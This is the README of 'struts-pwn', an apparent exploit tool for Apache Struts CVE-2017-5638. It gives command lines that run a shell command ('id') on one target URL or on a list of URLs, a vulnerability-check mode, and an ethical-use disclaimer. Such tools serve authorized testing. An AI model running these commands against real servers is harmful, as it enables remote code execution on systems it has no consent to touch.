*struts-pwn*
============

### An exploit for Apache Struts CVE-2017-5638 ###


# **Usage** #

## Testing a single URL. ##
`python struts-pwn.py --url 'http://example.com/struts2-showcase/index.action' -c 'id'`

## Testing a list of URLs. ##
`python struts-pwn.py --list 'urls.txt' -c 'id'`

## Checking if the vulnerability exists against a single URL. ##
`python struts-pwn.py --check --url 'http://example.com/struts2-showcase/index.action'`

## Checking if the vulnerability exists against a list of URLs. ##
`python struts-pwn.py --check --list 'urls.txt'`


# **Requirements** #
* Python2 or Python3
* requests


# **Legal Disclaimer** #
This project is made for educational and ethical testing purposes only. Usage of struts-pwn for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program.


# **License** #
The project is licensed under MIT License.


# **Author** #
*Mazin Ahmed*
* Website: [https://mazinahmed.net](https://mazinahmed.net)
* Email: *mazin AT mazinahmed DOT net*
* Twitter: [https://twitter.com/mazen160](https://twitter.com/mazen160)
* Linkedin: [http://linkedin.com/in/infosecmazinahmed](http://linkedin.com/in/infosecmazinahmed)
